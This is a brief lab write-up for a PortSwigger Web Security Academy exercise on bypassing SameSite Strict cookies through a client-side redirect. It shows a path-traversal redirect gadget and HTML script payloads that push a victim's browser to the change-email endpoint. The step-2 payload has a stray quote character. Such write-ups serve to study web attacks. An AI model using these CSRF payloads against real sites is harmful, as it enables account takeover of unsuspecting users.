# SameSite Strict bypass via client-side redirect

## This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

## You can log in to your own account using the following credentials: `wiener:peter`

### step1

update email
and send to repeater

go to cmment post comment
after comment post you will note page redirect automatically
https://0a17009103bdf00680f8585e00de0066.web-security-academy.net/post/comment/confirmation?postId=2

it will be redirect to
https://0a17009103bdf00680f8585e00de0066.web-security-academy.net/post/2

https://0a17009103bdf00680f8585e00de0066.web-security-academy.net/post/comment/confirmation?postId=../my-account
it wll redirect to
https://0a17009103bdf00680f8585e00de0066.web-security-academy.net/my-account

### step2

```html
<script>
  document.location =
    "'https://0a17009103bdf00680f8585e00de0066.web-security-academy.net/post/comment/confirmation?postId=../my-account";
</script>
```

click on store and view expolit it will redirect to home page

### step3 final

```html
<script>
  document.location =
    "https://0a17009103bdf00680f8585e00de0066.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
